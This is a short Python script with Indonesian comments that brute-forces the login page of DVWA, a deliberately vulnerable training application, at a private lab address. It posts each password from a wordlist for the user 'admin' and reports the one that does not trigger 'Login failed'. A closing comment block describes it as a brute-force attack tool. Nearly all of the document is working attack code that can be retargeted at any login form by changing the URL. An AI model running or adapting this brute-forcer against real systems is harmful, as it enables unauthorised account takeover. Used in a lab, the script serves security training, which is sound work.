# Import library requests untuk memanipulasi permintaan HTTP
import requests

# Tentukan URL target
url = "http://10.0.0.139"

# URL untuk halaman login
login_url = url + "/dvwa/login.php"

# Nama file wordlist
arquivo = "wordlist.txt"

# Nama pengguna default
usuario = "admin"

# Fungsi untuk melakukan permintaan HTTP dengan username dan password yang diberikan
def request(username, password):
    # Data berisi JSON dengan parameter username dan password
    data = {'username': username, 'password': password, "Login": 'submit'}

    # Kirim permintaan POST dan simpan responsenya
    r = requests.post(login_url, data=data)

    # Periksa apakah responsenya mengandung string "Login failed"
    if "Login failed" in r.text:
        print("Tidak dapat menemukan kata sandi!!")
    else:
        print("Kata sandi adalah: " + usuario + " | " + password)

# Buka file wordlist
wordlist = open(arquivo, "r")

# Iterasi melalui setiap kata sandi dalam wordlist dan coba login
for i in wordlist:
    print("Menguji " + usuario + " || " + i)
    request(usuario, i)
    print("===============================")

# ============================================================================= 
# Tujuan dari kode program ini adalah untuk melakukan serangan brute force pada halaman login sebuah situs web yang ditentukan. Kode ini mengimport library `requests` untuk melakukan manipulasi HTTP request, kemudian mendefinisikan variabel-variabel seperti URL target, URL login, file wordlist yang berisi kumpulan kata sandi yang mungkin, dan nama pengguna default.

# Fungsi `request(username, password)` digunakan untuk melakukan HTTP POST request dengan menyertakan nama pengguna dan kata sandi yang akan diuji. Jika respon dari server mengandung string "Login failed", maka program akan mencetak pesan bahwa kata sandi tidak ditemukan. Namun, jika tidak mengandung string tersebut, maka program akan mencetak bahwa kata sandi berhasil ditemukan.

# Selanjutnya, program membuka file wordlist yang berisi kumpulan kata sandi potensial. Kemudian, menggunakan struktur pengulangan `for`, setiap kata sandi dalam wordlist akan dicoba untuk melakukan login dengan memanggil fungsi `request(username, password)`.

# Jadi, secara keseluruhan, tujuan kode program ini adalah untuk mencoba serangkaian kata sandi dari wordlist untuk melakukan serangan brute force pada halaman login suatu situs web.
